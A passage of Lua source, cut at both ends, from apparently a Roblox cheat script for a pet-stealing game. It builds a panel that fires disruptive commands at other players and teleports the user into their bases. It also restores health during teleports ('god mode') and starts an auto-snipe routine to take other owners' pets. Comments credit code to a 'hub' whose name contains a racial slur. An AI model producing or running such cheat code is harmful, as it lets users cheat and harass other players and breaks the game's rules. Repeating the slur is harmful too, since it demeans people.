        dName.Size = UDim2.new(1, 0, 0, 16)
        dName.Position = UDim2.new(0, 0, 0, 6)
        dName.BackgroundTransparency = 1
        dName.Font = Enum.Font.GothamBlack
        dName.TextSize = 13
        dName.TextColor3 = Color3.fromRGB(225, 225, 238)
        dName.TextXAlignment = Enum.TextXAlignment.Left
        dName.TextTruncate = Enum.TextTruncate.AtEnd
        dName.Text = plr.DisplayName
        dName.ZIndex = 3

        local uName = Instance.new("TextLabel", infoFrame)
        uName.Size = UDim2.new(1, 0, 0, 12)
        uName.Position = UDim2.new(0, 0, 0, 24)
        uName.BackgroundTransparency = 1
        uName.Font = Enum.Font.GothamMedium
        uName.TextSize = 10
        uName.TextColor3 = Color3.fromRGB(90, 92, 105)
        uName.TextXAlignment = Enum.TextXAlignment.Left
        uName.TextTruncate = Enum.TextTruncate.AtEnd
        uName.Text = "@" .. plr.Name
        uName.ZIndex = 3

        local stealingLbl = Instance.new("TextLabel", infoFrame)
        stealingLbl.Size = UDim2.new(1, 0, 0, 13)
        stealingLbl.Position = UDim2.new(0, 0, 0, 41)
        stealingLbl.BackgroundTransparency = 1
        stealingLbl.Font = Enum.Font.Ubuntu
        stealingLbl.TextSize = 9
        stealingLbl.TextColor3 = Color3.fromRGB(255, 165, 40)
        stealingLbl.TextXAlignment = Enum.TextXAlignment.Left
        stealingLbl.TextTruncate = Enum.TextTruncate.AtEnd
        stealingLbl.Text = ""
        stealingLbl.Visible = false
        stealingLbl.ZIndex = 3

        -- ── Blacklist badge — canto inferior esquerdo do avatar ──────────────
        local blBadgeIsLocked = isBlacklisted and isBlacklisted(plr.Name) or false
        local blBadge = Instance.new("TextButton", row)
        blBadge.Size = UDim2.new(0, 14, 0, 14)
        -- Overlay bottom-left corner of avatar (avatar at x=8, size=38, bottom = 0.5+19)
        blBadge.Position = UDim2.new(0, 7, 0.5, 12)
        blBadge.AnchorPoint = Vector2.new(0, 0.5)
        blBadge.ZIndex = 8
        blBadge.AutoButtonColor = false
        blBadge.Text = blBadgeIsLocked and "🔒" or "⊘"
        blBadge.TextSize = blBadgeIsLocked and 10 or 11
        blBadge.Font = Enum.Font.Ubuntu
        blBadge.TextColor3 = blBadgeIsLocked and Color3.fromRGB(255, 200, 80) or Color3.fromRGB(255, 100, 100)
        blBadge.BackgroundColor3 = blBadgeIsLocked and Color3.fromRGB(80, 55, 10) or Color3.fromRGB(80, 12, 12)
        blBadge.BackgroundTransparency = 0
        blBadge.BorderSizePixel = 0
        Instance.new("UICorner", blBadge).CornerRadius = UDim.new(1, 0)
        local blBadgeStroke = Instance.new("UIStroke", blBadge)
        blBadgeStroke.Color = blBadgeIsLocked and Color3.fromRGB(220, 150, 30) or Color3.fromRGB(200, 40, 40)
        blBadgeStroke.Thickness = 1
        blBadgeStroke.Transparency = 0.3

        local function refreshBlBadge()
            local locked = isBlacklisted and isBlacklisted(plr.Name) or false
            if locked then
                blBadge.Text = "🔒"
                blBadge.TextSize = 10
                blBadge.TextColor3 = Color3.fromRGB(255, 200, 80)
                blBadge.BackgroundColor3 = Color3.fromRGB(80, 55, 10)
                blBadgeStroke.Color = Color3.fromRGB(220, 150, 30)
            else
                blBadge.Text = "⊘"
                blBadge.TextSize = 11
                blBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
                blBadge.BackgroundColor3 = Color3.fromRGB(80, 12, 12)
                blBadgeStroke.Color = Color3.fromRGB(200, 40, 40)
            end
        end

        blBadge.MouseEnter:Connect(function()
            blBadge.BackgroundColor3 = Color3.fromRGB(140, 20, 20)
        end)
        blBadge.MouseLeave:Connect(function()
            refreshBlBadge()
        end)
        blBadge.MouseButton1Click:Connect(function()
            local already = isBlacklisted and isBlacklisted(plr.Name) or false
            if already then
                -- Remove da blacklist
                if removeFromBlacklist then removeFromBlacklist(plr.Name) end
                ShowNotification("BLACKLIST", "Removed: " .. plr.Name)
            else
                -- Adiciona à blacklist
                table.insert(BlacklistedPlayers, plr.Name)
                Config.Blacklist = BlacklistedPlayers
                SaveConfig()
                -- refreshBlacklistUI
                ShowNotification("BLACKLIST", "Blacklisted: " .. plr.Name)
                -- rebuildBlList()
            end
            task.defer(refreshBlBadge)
        end)

        -- infoFrame: leave room for btnCont on the right
        -- btnCont = 5 cmds (GAP*4+BTN_W = 120+26=146) + 4gap + TP(30) = 180px
        local BTNCONT_W = 162
        infoFrame.Size = UDim2.new(1, -(45 + BTNCONT_W + 6), 1, 0)

        -- ── Button container ───────────────────────────────────────────────
        local btnCont = Instance.new("Frame", row)
        btnCont.Size = UDim2.new(0, BTNCONT_W, 1, 0)
        btnCont.Position = UDim2.new(1, -(BTNCONT_W + 4), 0, 0)
        btnCont.BackgroundTransparency = 1
        btnCont.ZIndex = 3

        -- Shared hover highlight — only border, no fill
        local hoverHL = Instance.new("Frame", btnCont)
        hoverHL.Size = UDim2.new(0, BTN_W + 2, 0, BTN_W + 2)
        hoverHL.BackgroundTransparency = 1
        hoverHL.BorderSizePixel = 0
        hoverHL.ZIndex = 3
        hoverHL.Visible = false
        Instance.new("UICorner", hoverHL).CornerRadius = UDim.new(0, 7)
        local hoverHLStroke = Instance.new("UIStroke", hoverHL)
        hoverHLStroke.Color = Color3.fromRGB(185, 188, 200)
        hoverHLStroke.Thickness = 1.5
        hoverHLStroke.Transparency = 0

        local function makeIconBtn(emoji, xPos)
            local b = Instance.new("TextButton", btnCont)
            b.Size = UDim2.new(0, BTN_W, 0, BTN_W)
            b.Position = UDim2.new(0, xPos, 0.5, -BTN_W/2)
            b.AutoButtonColor = false
            b.Text = emoji
            b.TextSize = 16
            b.Font = Enum.Font.Ubuntu
            b.TextColor3 = Color3.new(1, 1, 1)
            b.ZIndex = 5
            b.Active = true
            b.BackgroundTransparency = 1
            b.BorderSizePixel = 0
            b.MouseEnter:Connect(function()
                hoverHL.Position = UDim2.new(b.Position.X.Scale, b.Position.X.Offset - 1, b.Position.Y.Scale, b.Position.Y.Offset - 1)
                hoverHL.Visible = true
            end)
            b.MouseLeave:Connect(function() hoverHL.Visible = false end)
            return b
        end

        local GAP = 26
        local cmdDefs = {
            {emoji="🤸", cmd="ragdoll", x=0},
            {emoji="🔒", cmd="jail",    x=GAP},
            {emoji="🚀", cmd="rocket",  x=GAP*2},
            {emoji="🧬", cmd="morph",   x=GAP*3},
            {emoji="🎈", cmd="balloon", x=GAP*4},
        }

        for _, def in ipairs(cmdDefs) do
            local b = makeIconBtn(def.emoji, def.x)
            if not SharedState.AdminButtonCache[def.cmd] then SharedState.AdminButtonCache[def.cmd] = {} end
            table.insert(SharedState.AdminButtonCache[def.cmd], b)
            task.spawn(function()
                while b and b.Parent do
                    task.wait(0.5)
                    b.TextColor3 = isOnCooldown(def.cmd) and Color3.fromRGB(220, 60, 60) or Color3.new(1, 1, 1)
                end
            end)
            b.MouseButton1Click:Connect(function()
                if isBlacklisted(plr.Name) then ShowNotification("ADMIN", plr.Name .. " is blacklisted"); return end
                if isOnCooldown(def.cmd) then ShowNotification("ADMIN", def.cmd .. " on cooldown"); return end
                if runAdminCommand(plr, def.cmd) then
                    activeCooldowns[def.cmd] = tick()
                    setGlobalVisualCooldown(def.cmd)
                    if def.cmd == "balloon" then
                        SharedState.BalloonedPlayers[plr.UserId] = true
                        updateBalloonButtons()
                    end
                    ShowNotification("ADMIN", "Sent " .. def.cmd)
                else
                    ShowNotification("ADMIN", "Failed " .. def.cmd)
                end
            end)
        end

        -- TP button
        local tpBtn = Instance.new("TextButton", btnCont)
        tpBtn.Size = UDim2.new(0, BTN_W + 4, 0, BTN_W)
        tpBtn.Position = UDim2.new(0, GAP*4 + BTN_W + 4, 0.5, -BTN_W/2)
        tpBtn.AutoButtonColor = false
        tpBtn.Text = "TP"
        tpBtn.TextSize = 9
        tpBtn.Font = Enum.Font.GothamBlack
        tpBtn.TextColor3 = Color3.fromRGB(80, 140, 255)
        tpBtn.ZIndex = 5
        tpBtn.Active = true
        tpBtn.BackgroundColor3 = Color3.fromRGB(16, 28, 20)
        tpBtn.BackgroundTransparency = 0
        tpBtn.BorderSizePixel = 0
        Instance.new("UICorner", tpBtn).CornerRadius = UDim.new(0, 6)
        local tpStroke = Instance.new("UIStroke", tpBtn)
        tpStroke.Color = Color3.fromRGB(80, 140, 255); tpStroke.Thickness = 1; tpStroke.Transparency = 1
        tpBtn.MouseEnter:Connect(function() tpBtn.BackgroundColor3 = Color3.fromRGB(28, 50, 32); tpStroke.Transparency = 0.1 end)
        tpBtn.MouseLeave:Connect(function() tpBtn.BackgroundColor3 = Color3.fromRGB(16, 28, 20); tpStroke.Transparency = 1 end)
        tpBtn.MouseButton1Click:Connect(function()
            if _G.tpToPlayerBase then
                tpBtn.Text = "..."
                tpBtn.TextColor3 = Color3.fromRGB(255, 240, 80)
                task.spawn(function()
                    pcall(_G.tpToPlayerBase, plr)
                    task.wait(1)
                    if tpBtn and tpBtn.Parent then tpBtn.Text = "TP"; tpBtn.TextColor3 = Color3.fromRGB(80, 140, 255) end
                end)
            end
        end)

        -- ── Live update loop ───────────────────────────────────────────────
        task.spawn(function()
            while row.Parent do
                task.wait(0.5)
                if not plr or not plr.Parent or not Players:FindFirstChild(plr.Name) then
                    removePlayer(plr); break
                end
                local stealing = plr:GetAttribute("Stealing")
                local petName = plr:GetAttribute("StealingIndex")
                if stealing then
                    stealingLbl.Text = "⚡ STEALING: " .. (petName or "...")
                    stealingLbl.Visible = true
                    row.Size = UDim2.new(1, 0, 0, ROW_H_STEALING)
                    row.BackgroundColor3 = Color3.fromRGB(28, 20, 12)
                    rowStroke.Color = Color3.fromRGB(200, 130, 30)
                    rowStroke.Transparency = 0.3
                else
                    stealingLbl.Text = ""
                    stealingLbl.Visible = false
                    row.Size = UDim2.new(1, 0, 0, ROW_H_NORMAL)
                    row.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
                    rowStroke.Color = Color3.fromRGB(35, 37, 43)
                    rowStroke.Transparency = 0.65
                end
                -- Update held tool label
                pcall(function()
                    local ht = nil
                    local c = plr.Character
                    if c then for _, o in ipairs(c:GetChildren()) do if o:IsA("Tool") then ht = o.Name; break end end end
                    if ht then
                        uName.Text = "@" .. plr.Name .. "  •  " .. ht
                    else
                        uName.Text = "@" .. plr.Name
                    end
                end)
            end
        end)

        -- Initial stealing state
        local stealing = plr:GetAttribute("Stealing")
        local petName = plr:GetAttribute("StealingIndex")
        if stealing then
            stealingLbl.Text = "⚡ STEALING: " .. (petName or "...")
            stealingLbl.Visible = true
            row.Size = UDim2.new(1, 0, 0, ROW_H_STEALING)
            row.BackgroundColor3 = Color3.fromRGB(28, 20, 12)
            rowStroke.Color = Color3.fromRGB(200, 130, 30)
            rowStroke.Transparency = 0.3
        end

        row.MouseButton1Click:Connect(function()
            if SharedState.SelectedAdminCommand then
                if not isOnCooldown(SharedState.SelectedAdminCommand) then
                    if runAdminCommand(plr, SharedState.SelectedAdminCommand) then
                        activeCooldowns[SharedState.SelectedAdminCommand] = tick()
                    end
                end
            else
                triggerAll(plr)
            end
        end)

        return row
    end
    local playerRows = {}

    local playerRowsByUserId = {}

    
    -- TP to player's base (lógica do niggahub)
    local function findPlotBySignForPlayer(player)
        local plots = Workspace:FindFirstChild("Plots")
        if not plots or not player then return nil end
        local username = tostring(player.Name or ""):lower()
        local displayName = tostring(player.DisplayName or ""):lower()
        for _, plot in ipairs(plots:GetChildren()) do
            local sign = plot:FindFirstChild("PlotSign")
            if sign then
                local surfaceGui = sign:FindFirstChildWhichIsA("SurfaceGui", true)
                if surfaceGui then
                    for _, ui in ipairs(surfaceGui:GetDescendants()) do
                        if ui:IsA("TextLabel") or ui:IsA("TextButton") then
                            local t = ui.Text
                            if type(t) == "string" then
                                local tl = t:lower()
                                if (username ~= "" and tl:find(username, 1, true))
                                or (displayName ~= "" and tl:find(displayName, 1, true)) then
                                    local signPart = sign:IsA("BasePart") and sign
                                                  or sign:FindFirstChildWhichIsA("BasePart", true)
                                    return plot, signPart
                                end
                            end
                        end
                    end
                end
            end
        end
        return nil
    end

    _G.tpToPlayerBase = function(targetPlayer)
        if State.isTpMoving then ShowNotification("TP BASE", "Already teleporting!"); return end
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChild("Humanoid")
        if not hrp or not hum or hum.Health <= 0 then return end
        local targetPlot, targetSignPart = findPlotBySignForPlayer(targetPlayer)
        if not targetPlot then ShowNotification("TP BASE", "Base not found"); return end
        pcall(function()
            local plotPos = nil
            pcall(function() plotPos = targetPlot:GetPivot().Position end)
            if not plotPos then
                local p = targetPlot:FindFirstChild("MainRootPart") or targetPlot:FindFirstChildWhichIsA("BasePart")
                if p then plotPos = p.Position end
            end
            if not plotPos then return end
            State.isTpMoving = true
            ShowNotification("TP BASE", targetPlayer.DisplayName or targetPlayer.Name)
            local carpetName = Config.TpSettings and Config.TpSettings.Tool or "Flying Carpet"
            if carpetName and carpetName ~= "" then
                local carpet = LocalPlayer.Backpack:FindFirstChild(carpetName) or char:FindFirstChild(carpetName)
                if carpet then pcall(function() hum:EquipTool(carpet) end) end
            end
            local entryPos = plotPos + Vector3.new(0, 5, 0)
            if targetSignPart and targetSignPart:IsA("BasePart") then
                local signPos = targetSignPart.Position
                local dir = (signPos - plotPos)
                dir = (dir.Magnitude < 0.5) and targetSignPart.CFrame.LookVector or dir.Unit
                entryPos = signPos + dir * 10 + Vector3.new(0, 3, 0)
            end
            local jumpStart = tick()
            while hrp.Position.Y < math.max(entryPos.Y, 30) and (tick() - jumpStart) < 2 do
                hrp.AssemblyLinearVelocity = Vector3.new(0, 280, 0)
                RunService.Heartbeat:Wait()
            end
            for _ = 1, 8 do
                hrp.AssemblyLinearVelocity = Vector3.zero
                if (hrp.Position - entryPos).Magnitude > 3 then
                    hrp.CFrame = CFrame.new(entryPos); task.wait(0.03)
                end
            end
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
        end)
        State.isTpMoving = false
    end

    local function addPlayer(plr)

        if plr == LocalPlayer or playerRowsByUserId[plr.UserId] then return end

        if not Players:FindFirstChild(plr.Name) then return end

        

        if playerRows[plr] then return end

        

        local row = createPlayerRow(plr)

        playerRows[plr] = row

        playerRowsByUserId[plr.UserId] = {player = plr, row = row}

        listFrame.CanvasSize = UDim2.new(0,0,0, layout.AbsoluteContentSize.Y)

        sortAdminPanelList()

    end

    

    local function removePlayer(plr)

        local userId = plr and plr.UserId or nil

        local entry = userId and playerRowsByUserId[userId] or nil

        local row = entry and entry.row or playerRows[plr]

        

        if row then

            if row.Parent then

                for cmd, buttons in pairs(SharedState.AdminButtonCache) do

                    for i = #buttons, 1, -1 do

                        if buttons[i] and buttons[i].Parent == row then

                            table.remove(buttons, i)

                        end

                    end

                end

                row:Destroy()

            end

            if plr then

                playerRows[plr] = nil

            end

            if userId then

                playerRowsByUserId[userId] = nil

            end

            if SharedState.BalloonedPlayers and userId then

                SharedState.BalloonedPlayers[userId] = nil

            end

            listFrame.CanvasSize = UDim2.new(0,0,0, layout.AbsoluteContentSize.Y)

        end

    end

    -- Auto-refresh (sem botão REFRESH)
    local refreshBtn = Instance.new("TextButton")
    refreshBtn.Visible = false; refreshBtn.Parent = frame
    refreshBtn.MouseButton1Click:Connect(function()

        for _, row in pairs(playerRows) do

            if row and row.Parent then

                for cmd, buttons in pairs(SharedState.AdminButtonCache) do

                    for i = #buttons, 1, -1 do

                        if buttons[i] and buttons[i].Parent == row then

                            table.remove(buttons, i)

                        end

                    end

                end

                row:Destroy()

            end

        end

        

        playerRows = {}

        playerRowsByUserId = {}

        SharedState.AdminButtonCache = {}

        SharedState.BalloonedPlayers = {}

        

        for _, child in ipairs(listFrame:GetChildren()) do

            if child:IsA("TextButton") then

                child:Destroy()

            end

        end

        

        task.wait(0.1)

        

        for _, p in ipairs(Players:GetPlayers()) do

            if p ~= LocalPlayer then 

                addPlayer(p) 

            end

        end

        sortAdminPanelList()

        

        ShowNotification("ADMIN PANEL", "Completely refreshed - " .. #Players:GetPlayers() - 1 .. " players found")

    end)

    Players.PlayerAdded:Connect(function(plr)

        task.wait(0.1)

        if plr and plr.Parent then

            addPlayer(plr)

        end

    end)

    

    Players.PlayerRemoving:Connect(function(plr)

        removePlayer(plr)

    end)

    

    for _, p in ipairs(Players:GetPlayers()) do

        if p ~= LocalPlayer then addPlayer(p) end

    end

    sortAdminPanelList()

    task.spawn(function()

        while listFrame and listFrame.Parent do

            task.wait(0.5)

            pcall(sortAdminPanelList)

        end

    end)

    

    task.spawn(function()

        while true do

            task.wait(1)

            local currentPlayerIds = {}

            for _, p in ipairs(Players:GetPlayers()) do

                if p ~= LocalPlayer and p.Parent then

                    currentPlayerIds[p.UserId] = true

                end

            end

            

            for userId, entry in pairs(playerRowsByUserId) do

                if not currentPlayerIds[userId] or not entry.player or not entry.player.Parent or not Players:FindFirstChild(entry.player.Name) then

                    removePlayer(entry.player)

                end

            end

            

            for _, p in ipairs(Players:GetPlayers()) do

                if p ~= LocalPlayer and p.Parent and not playerRowsByUserId[p.UserId] then

                    addPlayer(p)

                end

            end

        end

    end)

    

    layout.Changed:Connect(function() listFrame.CanvasSize = UDim2.new(0,0,0, layout.AbsoluteContentSize.Y) end)

end)

local function findFlyingCarpet()

    local map = Workspace:FindFirstChild("Map")

    if not map then return nil end

    local carpet = map:FindFirstChild("Carpet")

    if not carpet then return nil end

    if carpet:IsA("Model") then

        if carpet.PrimaryPart then return carpet.PrimaryPart end

        for _, c in ipairs(carpet:GetChildren()) do if c:IsA("BasePart") then return c end end

    elseif carpet:IsA("BasePart") then

        return carpet

    end

    return nil

end

local function findClaimModel(podium)

    if not podium or not podium.Parent then return nil end

    local claim = podium:FindFirstChild("Claim")

    if claim and claim:IsA("Model") then

        if claim.PrimaryPart then return claim.PrimaryPart end

        for _, c in ipairs(claim:GetChildren()) do if c:IsA("BasePart") then return c end end

    end

    return nil

end

local function getTargetPodiumAndSafePosition(animalData, fallbackPos)
    if not animalData or not animalData.plot then return nil, fallbackPos end
    local plots = Workspace:FindFirstChild("Plots")
    local plot = plots and plots:FindFirstChild(animalData.plot)
    local podiums = plot and plot:FindFirstChild("AnimalPodiums")
    if not podiums then return nil, fallbackPos end
    local clampedY = fallbackPos and math.min(fallbackPos.Y, 24)
    local safeName = (clampedY and clampedY > 8.8) and "13" or "3"
    local safePod = podiums:FindFirstChild(safeName)
    local safeBase = safePod and safePod:FindFirstChild("Base")
    local safeSpawn = safeBase and safeBase:FindFirstChild("Spawn")
    return safePod, (safeSpawn and safeSpawn:IsA("BasePart") and safeSpawn.Position) or fallbackPos
end

local function playFullScreenFlash()
    local char = LocalPlayer.Character
    if not char then return end
    local saved = {}
    for _, p in ipairs(char:GetDescendants()) do
        if p:IsA("BasePart") then
            saved[p] = p.LocalTransparencyModifier
            p.LocalTransparencyModifier = 1
        end
    end
    task.spawn(function()
        while State.isTpMoving do task.wait(0.05) end
        for p, orig in pairs(saved) do
            if p and p.Parent then p.LocalTransparencyModifier = orig end
        end
    end)
end

local isTpMoving = State.isTpMoving

_G._isTargetPlotUnlocked = function(plotName)

    local ok, res = pcall(function()

        local plots = Workspace:FindFirstChild("Plots")

        if not plots then return false end

        local targetPlot = plots:FindFirstChild(plotName)

        if not targetPlot then return false end

        local unlockFolder = targetPlot:FindFirstChild("Unlock")

        if not unlockFolder then return true end

        local unlockItems = {}

        for _, item in pairs(unlockFolder:GetChildren()) do

            local pos = nil

            if item:IsA("Model") then pcall(function() pos = item:GetPivot().Position end)

            elseif item:IsA("BasePart") then pos = item.Position end

            if pos then table.insert(unlockItems, {Object = item, Height = pos.Y}) end

        end

        table.sort(unlockItems, function(a, b) return a.Height < b.Height end)

        if #unlockItems == 0 then return true end

        local floor1Door = unlockItems[1].Object

        for _, desc in ipairs(floor1Door:GetDescendants()) do

            if desc:IsA("ProximityPrompt") and desc.Enabled then return false end

        end

        for _, child in ipairs(floor1Door:GetChildren()) do

            if child:IsA("ProximityPrompt") and child.Enabled then return false end

        end

        return true

    end)

    return ok and res or false

end

-- ══════════════════════════════════════════════════════════════════════════
-- ▸ TpCfg · CONFIG CENTRAL DO TP (editável via UI ou diretamente aqui) ◂
-- ══════════════════════════════════════════════════════════════════════════
local TpCfg = _G.TpCfg or {
    VERTICAL_BOOST   = 200,    -- força dos impulsos verticais (Y)

    -- Tempos (em segundos, são multiplicados por SLOW_MULT quando slow)
    WAIT_CARPETE     = 0.06,   -- após equipar o carpete
    WAIT_IMPULSO1    = 0.05,   -- após 1º impulso (Etapa 7)
    WAIT_TP_MEIO     = 0.04,   -- após TP pro MAP_CENTER (Etapa 8)
    WAIT_POS_POUSO   = 0.03,   -- após pousar no chão (Etapa 9)
    WAIT_IMPULSO2    = 0.05,   -- após 2º impulso (Etapa 10) — antes de ir pra base
    WAIT_TP_CARPETE  = 0.06,   -- após TP pro carpete (Etapa 13)
    WAIT_PRECLONE_A  = 0.06,   -- pré-clone (1º)
    WAIT_PRECLONE_B  = 0.25,   -- pré-clone (2º)
    WAIT_EMPURRAO    = 0.15,   -- duração do empurrão pós-clone

    LANDING_TIMEOUT  = 2,      -- timeout do waitLanding (s reais)

    -- Coord-impulso por base (MAP_CENTER per base 1-8)
    -- Centro fixo do mapa (ponto neutro para o impulso — calculado com ShowMapCenter)
    BASE_IMPULSO = {
        [1] = Vector3.new(-409.6, -4, 60.1),
        [2] = Vector3.new(-409.6, -4, 60.1),
        [3] = Vector3.new(-409.6, -4, 60.1),
        [4] = Vector3.new(-409.6, -4, 60.1),
        [5] = Vector3.new(-409.6, -4, 60.1),
        [6] = Vector3.new(-409.6, -4, 60.1),
        [7] = Vector3.new(-409.6, -4, 60.1),
        [8] = Vector3.new(-409.6, -4, 60.1),
    },
    DEFAULT_IMPULSO = Vector3.new(-409.6, -4, 60.1),
}
_G.TpCfg = TpCfg

-- ── FPS tracker (média por segundo via Heartbeat) ─────────────────────────
local _fpsCurrent = 60
do
    local frames, elapsed = 0, 0
    RunService.Heartbeat:Connect(function(dt)
        frames = frames + 1
        elapsed = elapsed + dt
        if elapsed >= 0.25 then
            _fpsCurrent = frames / elapsed
            frames, elapsed = 0, 0
        end
    end)
end
local function getCurrentFps() return _fpsCurrent end

-- Detecta a base (1-8) a partir da posição do pet (lógica col/row).
local function getBaseNumberFromPos(pos)
    if not pos then return nil end
    local col = (pos.X < -400) and 1 or 2
    local row
    if     pos.Z < -40  then row = 1
    elseif pos.Z <  60  then row = 2
    elseif pos.Z < 160  then row = 3
    else                     row = 4
    end
    return col == 1 and row or (row + 4)
end

local function getImpulsoForBase(baseNum)
    return (baseNum and TpCfg.BASE_IMPULSO[baseNum]) or TpCfg.DEFAULT_IMPULSO
end

-- ══════════════════════════════════════════════════════════════════════════
-- ▸ FRONT TP · Constantes e helper (lógica importada do niggahub) ◂
-- ══════════════════════════════════════════════════════════════════════════
local BASES_LOW = {
    [1] = Vector3.new(-460, -6, 219), [5] = Vector3.new(-355, -6, 217),
    [2] = Vector3.new(-460, -6, 111), [6] = Vector3.new(-355, -6, 113),
    [3] = Vector3.new(-460, -6, 5),   [7] = Vector3.new(-355, -6, 5),
    [4] = Vector3.new(-460, -6, -100),[8] = Vector3.new(-355, -6, -100)
}
local BASES_HIGH = {
    [1] = Vector3.new(-476.474853515625, 20.732906341552734, 220.94090270996094),   [5] = Vector3.new(-342.5367126464844, 20.69801902770996, 221.44737243652344),
    [2] = Vector3.new(-476.5684814453125, 20.70664405822754, 113.77315521240234),   [6] = Vector3.new(-342.8604736328125, 20.669641494750977, 113.41409301757812),
    [3] = Vector3.new(-476.8675842285156, 20.74148178100586, 6.178487777709961),    [7] = Vector3.new(-342.42108154296875, 20.687667846679688, 6.249461650848389),
    [4] = Vector3.new(-476.6324768066406, 20.744949340820312, -101.07275390625),    [8] = Vector3.new(-342.7937927246094, 20.748071670532227, -99.73458862304688)
}
local CLONE_POSITIONS_FLOOR = {
    Vector3.new(-476, -4, 221), Vector3.new(-476, -4, 114),
    Vector3.new(-476, -4, 7),   Vector3.new(-476, -4, -100),
    Vector3.new(-342, -4, -100),Vector3.new(-342, -4, 6),
    Vector3.new(-342, -4, 114), Vector3.new(-342, -4, 220)
}
local FACE_TARGETS = {
    Vector3.new(-519, -3, 221), Vector3.new(-519, -3, 114),
    Vector3.new(-518, -3, 7),   Vector3.new(-519, -3, -100),
    Vector3.new(-301, -3, -100),Vector3.new(-301, -3, 7),
    Vector3.new(-302, -3, 114), Vector3.new(-300, -3, 220)
}
local function getClosestBaseIdx(pos)
    local closest, dist = 1, math.huge
    for i, basePos in pairs(BASES_LOW) do
        local d = (Vector2.new(pos.X, pos.Z) - Vector2.new(basePos.X, basePos.Z)).Magnitude
        if d < dist then dist = d; closest = i end
    end
    return closest
end
-- ══════════════════════════════════════════════════════════════════════════
-- ▸ GOD MODE DURANTE TP · Evita morrer no teleporte ◂
-- ══════════════════════════════════════════════════════════════════════════
local _godModeConn = nil

local function enableGodMode()
    if _godModeConn then return end
    pcall(function()
        local char = LocalPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        -- Bloqueia dano: intercepta HealthChanged e restaura HP
        local prevHealth = hum.MaxHealth
        _godModeConn = hum.HealthChanged:Connect(function(hp)
            if hp < hum.MaxHealth * 0.9 then
                pcall(function() hum.Health = hum.MaxHealth end)
            end
        end)
        -- Força HP máximo imediatamente
        pcall(function() hum.Health = hum.MaxHealth end)
    end)
end

local function disableGodMode()
    if _godModeConn then
        pcall(function() _godModeConn:Disconnect() end)
        _godModeConn = nil
    end
end

-- ══════════════════════════════════════════════════════════════════════════
-- ▸ Desync (RakNet) · Toggle com F ◂
-- ══════════════════════════════════════════════════════════════════════════
-- [DESYNC SEPARADO]

-- Hook: ativa god mode durante TP e desativa após
local _origFinishTeleport = nil  -- será definida inline no runAutoSnipeSide

local function runAutoSnipeSide()
    if State.isTpMoving then return end

    local targetPetData = nil
    if Config.AutoTPPriority then
        local bestEntry = nil
        local cache = SharedState.AllAnimalsCache
        if cache and type(cache) == "table" then
            for _, pName in ipairs(PRIORITY_LIST) do
                local searchName = pName:lower()
                for _, a in ipairs(cache) do
                    if a and a.name and a.name:lower() == searchName and a.owner ~= LocalPlayer.Name then
                        bestEntry = a; break
                    end
                end
                if bestEntry then break end
            end
            if not bestEntry then
                for _, a in ipairs(cache) do
                    if a and a.owner ~= LocalPlayer.Name then bestEntry = a; break end
                end
            end
        end
        if bestEntry then targetPetData = bestEntry
        else
            if not SharedState.SelectedPetData then return end
            targetPetData = SharedState.SelectedPetData.animalData
        end
    else
        if not SharedState.SelectedPetData then return end
        targetPetData = SharedState.SelectedPetData.animalData
    end
    if not targetPetData then return end

    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChild("Humanoid")
    if not hrp or not hum or hum.Health <= 0 then return end

    State.isTpMoving = true

    local function finishTeleport()
        State.isTpMoving = false
    end

    local targetPart = findAdorneeGlobal(targetPetData)
    if not targetPart then finishTeleport(); return end

    local exactPos = targetPart.Position
    local targetPodium, targetPosition = getTargetPodiumAndSafePosition(targetPetData, exactPos)
    local isSecondFloor = targetPosition.Y > 10
    local claimPart = findClaimModel(targetPodium)

    local directionToPet = targetPosition - hrp.Position
    if directionToPet.Magnitude > 0 then
        directionToPet = Vector3.new(directionToPet.X, 0, directionToPet.Z).Unit
    else
        directionToPet = Vector3.new(0, 0, -1)
    end

    local dirBehind
    if claimPart then
        local df = claimPart.Position - targetPosition
        if df.Magnitude > 0 then
            dirBehind = -Vector3.new(df.X, 0, df.Z).Unit
        else
            dirBehind = -directionToPet
        end
    else
        dirBehind = -directionToPet
    end

    local behindPos = targetPosition + (dirBehind * 7)
    local rpPre = RaycastParams.new()
    rpPre.FilterDescendantsInstances = {char}
    rpPre.FilterType = Enum.RaycastFilterType.Exclude
    local resPre = Workspace:Raycast(
        Vector3.new(behindPos.X, targetPosition.Y + 10, behindPos.Z),
        Vector3.new(0, -1000, 0),
        rpPre
    )
    if not resPre then finishTeleport(); return end
    local finalHeight = resPre.Position.Y + 5.5
    local finalPos = Vector3.new(behindPos.X, finalHeight, behindPos.Z)
    local lookTarget = claimPart and Vector3.new(claimPart.Position.X, finalPos.Y, claimPart.Position.Z) or targetPosition

    local finalFacing = CFrame.lookAt(finalPos, lookTarget)
    local facingRot = finalFacing - finalFacing.Position
    hrp.CFrame = CFrame.new(hrp.Position) * facingRot

    if hrp.Position.Y > 25 and targetPosition.Y > 25 then
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
        hrp.CFrame = CFrame.new(finalPos) * facingRot
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
    else
        local carpetName = Config.TpSettings.Tool or "Flying Carpet"
        local carpet = LocalPlayer.Backpack:FindFirstChild(carpetName) or char:FindFirstChild(carpetName)
        if carpet and hum and hum.Parent then
            hum:EquipTool(carpet)
        end

        if not char.Parent or not hrp.Parent then finishTeleport(); return end

        hrp.CFrame = CFrame.new(hrp.Position) * facingRot
        if hum and hum.Parent then
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
        end
        task.wait(0.01)
        if not char.Parent or not hrp.Parent then finishTeleport(); return end
        hrp.CFrame = CFrame.new(hrp.Position.X, 35, hrp.Position.Z) * facingRot
        task.wait(0.1)

        if not char.Parent or not hrp.Parent then finishTeleport(); return end

        local positionBehindPet = targetPosition + (dirBehind * 18)
        local carpetPart = findFlyingCarpet()
        if not carpetPart then finishTeleport(); return end

        if not char.Parent or not hrp.Parent then finishTeleport(); return end
        local carpetPos = carpetPart.Position
